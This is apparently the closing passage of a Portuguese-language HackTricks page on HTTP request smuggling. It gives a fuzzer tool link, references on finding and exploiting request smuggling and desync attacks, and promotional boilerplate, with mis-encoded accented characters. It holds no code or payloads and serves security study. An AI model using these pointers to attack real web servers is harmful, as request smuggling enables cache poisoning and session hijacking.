* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta ferramenta √© um Fuzzer HTTP baseado em gram√°tica √∫til para encontrar discrep√¢ncias estranhas de smuggling de solicita√ß√£o.

## Refer√™ncias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
